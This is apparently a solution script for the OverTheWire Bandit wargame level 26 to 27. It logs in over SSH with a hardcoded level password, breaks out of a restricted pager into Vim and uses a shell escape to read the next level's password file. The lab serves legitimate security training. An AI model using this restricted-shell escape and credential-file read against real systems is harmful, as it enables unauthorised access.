print("[*] Bandit Level 26 -> 27: Shell Command v2")

let pass = "s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ"

print("[*] Connecting...")
let ssh = connect_ssh_pty("bandit.labs.overthewire.org", 2220, "bandit26", pass, 3, 20)
ssh_interactive_start(ssh)

print("[*] Wait for --More--")
let initial = ssh_interactive_recv(ssh, 1500)

print("[*] Enter Vim with 'v'")
ssh_interactive_send(ssh, "v")
let vim_start = ssh_interactive_recv(ssh, 1000)

print("[*] ENTER past startup")
ssh_interactive_send(ssh, "\r")
let ready1 = ssh_interactive_recv(ssh, 500)

print("[*] Resize window in Vim to avoid pagination")
ssh_interactive_send(ssh, ":set lines=100\r")
let resize = ssh_interactive_recv(ssh, 500)

print("[*] Execute cat command")
ssh_interactive_send(ssh, ":!cat /etc/bandit_pass/bandit27\r")
let cat_output = ssh_interactive_recv(ssh, 1500)

print("\n========== OUTPUT ==========")
print(cat_output)
print("============================\n")

ssh_interactive_close(ssh)
